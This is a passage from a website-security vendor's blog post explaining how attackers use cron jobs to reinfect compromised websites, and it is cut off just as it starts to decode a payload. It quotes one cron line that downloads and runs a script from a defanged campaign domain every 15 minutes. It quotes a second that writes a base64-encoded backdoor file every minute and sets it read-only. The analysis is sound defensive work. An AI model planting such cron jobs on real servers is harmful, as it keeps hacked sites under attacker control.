---
title: Attackers Abuse Cron Jobs to Reinfect Websites
url: https://blog.sucuri.net/2023/02/attackers-abuse-cron-jobs-to-reinfect-websites.html
source: Sucuri Blog
date: 2023-02-22
fetch_date: 2025-10-04T07:42:23.264336
---

# Attackers Abuse Cron Jobs to Reinfect Websites

[![Sucuri Blog](https://blog.sucuri.net/wp-content/uploads/2023/04/Sucuri_Blog_Header_Logo_342x60.png)](https://blog.sucuri.net/)

* Products
  + [Website Security Platform](https://sucuri.net/website-security-platform/)
  + [Website Firewall (WAF)](https://sucuri.net/website-firewall/)
  + [Multi-Site plans](https://sucuri.net/custom/agency/)
  + [Custom & Enterprise Plans](https://sucuri.net/custom/enterprise/)
  + [Partnerships](https://sucuri.net/partners/)
* Features
  + [Detection  Website Monitoring & Alerts](https://sucuri.net/malware-detection-scanning/)
  + [Protection  Future Website Hacks](https://sucuri.net/website-hack-protection/)
  + [Performance  Speed Up Your Website](https://sucuri.net/website-performance/)
  + [Response  Help For Hacked Websites](https://sucuri.net/website-malware-removal/)
  + [Backups  Disaster Recovery Plan](https://sucuri.net/website-backups/)
* Resources
  + [Guides](https://sucuri.net/guides/)
  + [Webinars](https://sucuri.net/webinars/)
  + [Infographics](https://sucuri.net/infographics/)
  + [Blog](/)
  + [SiteCheck](https://sitecheck.sucuri.net/)
  + [Reports](https://sucuri.net/reports/)
  + [Email Courses](https://sucuri.net/email-courses/)
* [Pricing](https://sucuri.net/website-security-platform/signup)
* [Immediate Help](https://sucuri.net/website-security-platform/help-now/)
* [Login](https://sucuri.net/website-security-platform/signup/)

[![Sucuri Blog](https://blog.sucuri.net/wp-content/uploads/2023/04/Sucuri_Blog_Header_Logo_342x60.png)](https://blog.sucuri.net/)

* Products
  + [Website Security Platform](https://sucuri.net/website-security-platform/)
  + [Website Firewall (WAF)](https://sucuri.net/website-firewall/)
  + [Multi-Site plans](https://sucuri.net/custom/agency/)
  + [Custom & Enterprise Plans](https://sucuri.net/custom/enterprise/)
  + [Partnerships](https://sucuri.net/partners/)
* Features
  + [Detection  Website Monitoring & Alerts](https://sucuri.net/malware-detection-scanning/)
  + [Protection  Future Website Hacks](https://sucuri.net/website-hack-protection/)
  + [Performance  Speed Up Your Website](https://sucuri.net/website-performance/)
  + [Response  Help For Hacked Websites](https://sucuri.net/website-malware-removal/)
  + [Backups  Disaster Recovery Plan](https://sucuri.net/website-backups/)
* Resources
  + [Guides](https://sucuri.net/guides/)
  + [Webinars](https://sucuri.net/webinars/)
  + [Infographics](https://sucuri.net/infographics/)
  + [Blog](/)
  + [SiteCheck](https://sitecheck.sucuri.net/)
  + [Reports](https://sucuri.net/reports/)
  + [Email Courses](https://sucuri.net/email-courses/)
* [Pricing](https://sucuri.net/website-security-platform/signup)
* [Immediate Help](https://sucuri.net/website-security-platform/help-now/)
* [Login](https://sucuri.net/website-security-platform/signup/)

* [Immediate Help](https://sucuri.net/website-security-platform/help-now/)

[Login](https://dashboard.sucuri.net/login/)

[Login](https://dashboard.sucuri.net/login)

New Customer?

[Sign up now.](https://sucuri.net/website-security-platform/signup/)

* [Submit a ticket](https://support.sucuri.net/support/?new)
* [Knowledge base](https://docs.sucuri.net/)
* [Chat now](https://sucuri.net/live-chat/)

Search for:

Search

* [Website Malware Infections](https://blog.sucuri.net/category/website-malware-infections)
* [Website Security](https://blog.sucuri.net/category/website-security)
* [WordPress Security](https://blog.sucuri.net/category/wordpress-security)

# Attackers Abuse Cron Jobs to Reinfect Websites

[![](https://secure.gravatar.com/avatar/49a04d32074892dc04d9ed823aa114f8492a90e9c88852302b083c90aa322c21?s=60&d=mm&r=g)](https://blog.sucuri.net/author/benmartin)

[Ben Martin](https://blog.sucuri.net/author/benmartin)

* February 21, 2023

![Attackers Abuse Cron Jobs to Reinfect Websites](https://blog.sucuri.net/wp-content/uploads/2023/02/23-BlogPost_Feature-Image_1490x700_Attackers-Abuse-Cron-Jobs-to-Reinfect-Websites-820x386.jpg)

Malicious cron jobs are nothing new; we’ve seen attackers use them quite [frequently](https://blog.sucuri.net/2022/03/new-wave-of-anonymousfox-cron-jobs.html) to reinfect websites. However, in recent months we’ve noticed a distinctive new wave of these infections that appears to be closely related to this article about a [backdoor](https://blog.sucuri.net/2023/02/konami-code-backdoor-concealed-in-image.html) that we’ve been tracking.

In today’s post we’ll be discussing what cron jobs are, how attackers leverage them to reinfect and access websites, and analyze a distinctive new wave of cron jobs.

## What is a cron job?

First thing’s first: Let’s review what a cron job is and why they would be useful to attackers. Essentially, a cron job is a scheduled task that runs periodically within a linux hosting environment.

There are many uses for cron jobs, and some examples include:

* Scheduling backups of databases and files
* Automating software updates
* Running analytic or sales reports
* Automation of email reports for new users or website traffic
* Cleaning up old, unnecessary files like old logs or temporary files
* Updating news feeds or stock/sales quotes
* Monitoring website health or any errors generated
* Send out Newsletters

They can save a lot of time from what would otherwise be fairly monotonous manual work. These scheduled tasks can be run daily, weekly, monthly, yearly, or — in the case of malicious cron jobs — much more frequently.

## How do attackers abuse cron jobs?

This begs the question: How do attackers abuse these scheduled tasks and how do they fit into a malware infection?

Most often the answer is quite simple: Reinfection (although in some rare cases the cron job fetches commands to run from a command and control server).

Let’s take a look at an older example of a fairly common malicious cron job:

```
*/15 * * * * wget -q -O xxxd hxxp://hello.hellodolly777[.]xyz/xxxd && chmod 0755 xxxd && /bin/sh xxxd /home/<REDACTED>/public_html 24 && rm -f xxxd
```

This malicious cron job runs once every 15 minutes. It grabs malicious content from a third party domain **hello[.]hellodolly777[.]xyz** (one of many domains used by this campaign) and executes it on the fly to reinfect the environment. The domain is a clear reference to the “Hello Dolly” WordPress plugin which comes bundled with a fresh installation. This type of cron job is associated with the [AnonymousFox toolkit](https://blog.sucuri.net/2022/03/new-wave-of-anonymousfox-cron-jobs.html) and has been around for a while (at least April of last year).

Website owners trying to clean up a malware infection from their environment before checking for these types of cron jobs can be in for a headache, so be sure to check this first before undergoing any sort of cleanup!

Now let’s take a look at the more recent wave of malicious cron jobs.

## New wave of attacks

In July 2022 the campaign related to the “[Konami code backdoor](https://blog.sucuri.net/2023/02/konami-code-backdoor-concealed-in-image.html)” started using cron jobs to drop persistent backdoors on compromised sites. There have been multiple variations of the cron jobs since then. Lately, the most common variant includes the telltale string **/9j/4jw/** at the beginning.

```
* * * * * fp="/home/[REDACTED]/public_html/[REDACTED].net/wp-admin/inc.php"; if [ ! -s "$fp" ]; then echo "/9j/4jw/cGhwICRzID0gImhlIiAuICJ4MmJpbiI7JF8gPSBhcnJheSgkcywi

... skipped ~30Kb of base64-encrypted data ...

EHrATItwLaD3IlEBWllpQW5SkYALm1vFy8XFBfWQ==" | base64 --decode &gt; "$fp"; fi; chmod 444 "$fp"
```

This cron job checks dumps the base64-decoded string to a certain file (in the case of this example it’s /**wp-admin/inc.php**) if it is empty or doesn’t exist and sets its permission to 444 (read-only) to prevent easy modifications.

The \* \* \* \* \* instruction in the cron job indicates that it is set to run every single minute, so it’s quite an aggressive reinfection schedule.

Let’s see what we get when we decode that base64 c...